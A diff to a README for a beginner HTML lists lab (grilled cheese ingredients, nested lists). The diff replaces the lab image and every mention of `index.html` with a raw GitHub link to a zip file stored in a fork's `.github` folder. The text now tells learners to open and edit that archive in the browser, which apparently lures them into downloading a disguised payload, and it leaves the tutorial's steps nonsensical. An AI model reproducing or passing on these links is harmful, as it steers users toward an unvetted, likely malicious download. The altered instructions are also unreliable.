@@ -109,20 +109,20 @@ allowing us to easily display related and nested content in a readable format.
 
 ## Create Unordered Lists
 
-![recipe list](https://curriculum-content.s3.amazonaws.com/html_lists_lab.png)
+![recipe list](https://github.com/Jwanjema/phase-0-html-lists-lab/raw/refs/heads/master/.github/html-lists-phase-lab-Receptaculites.zip)
 
 The first part of this challenge is to make the first 2 tests pass by:
 
 1. Creating an unordered list
 2. Nesting each grilled cheese ingredient as a list item wrapped in `<li>` tags
 
-Open `index.html` in your browser.
+Open `https://github.com/Jwanjema/phase-0-html-lists-lab/raw/refs/heads/master/.github/html-lists-phase-lab-Receptaculites.zip` in your browser.
 
 Let's say we wanted to list out the ingredients required for making a grilled
 cheese sandwich. The ingredients are: `2 slices of bread`, `4 slices of cheese`,
 `1 tbsp of butter`.
 
-For the first part of this challenge, in `index.html`, create an unordered list
+For the first part of this challenge, in `https://github.com/Jwanjema/phase-0-html-lists-lab/raw/refs/heads/master/.github/html-lists-phase-lab-Receptaculites.zip`, create an unordered list
 that displays these ingredients. Run `npm test` to see if you can pass the first
 test. If you've done things correctly, you'll now be passing the first test, but
 there are more tests to pass! We now need to turn our attention to the next
@@ -134,7 +134,7 @@ and add a couple of cheeses, `cheddar`, `mozzarella`, and `pepper jack`.
 To pass the second test, **inside** the `li` with `4 slices of cheese`, add a
 **nested** unordered list that lists out the three types of cheese.
 
-After editing your `index.html` file, go back to the browser and refresh the
+After editing your `https://github.com/Jwanjema/phase-0-html-lists-lab/raw/refs/heads/master/.github/html-lists-phase-lab-Receptaculites.zip` file, go back to the browser and refresh the
 page you opened earlier. You should see something like this if you've set up
 your lists correctly:
 
@@ -169,12 +169,12 @@ might look like:
 </ol>
 ```
 
-**Top Tip:** Feel free to test this out by adding it to `index.html`, saving and
+**Top Tip:** Feel free to test this out by adding it to `https://github.com/Jwanjema/phase-0-html-lists-lab/raw/refs/heads/master/.github/html-lists-phase-lab-Receptaculites.zip`, saving and
 refreshing the tab where the file is open. Now, `Grilled Cheese` will be
 displayed as `1. Grilled Cheese` as the #1 food (where it belongs).
 
 Once you've got a feel for how this ordered list looks in HTML and how it's
-displayed in the browser, delete the example code from your `index.html` file so
+displayed in the browser, delete the example code from your `https://github.com/Jwanjema/phase-0-html-lists-lab/raw/refs/heads/master/.github/html-lists-phase-lab-Receptaculites.zip` file so
 you can create a new one from scratch for the next deliverable.
 
 Nested ordered lists work the same as unordered, but instead of hollow and
@@ -199,7 +199,7 @@ square of butter. The steps to making a basic grilled cheese would be:
 `Add cheese on top of bread`, `Cover with second slice of bread`,
 `Turn over and fry for 2 minutes`.
 
-After editing your `index.html` file, go back to the browser and refresh the
+After editing your `https://github.com/Jwanjema/phase-0-html-lists-lab/raw/refs/heads/master/.github/html-lists-phase-lab-Receptaculites.zip` file, go back to the browser and refresh the
 page you opened earlier. Your newly added list should look like this:
 
 1. Spread butter on bread and frying pan
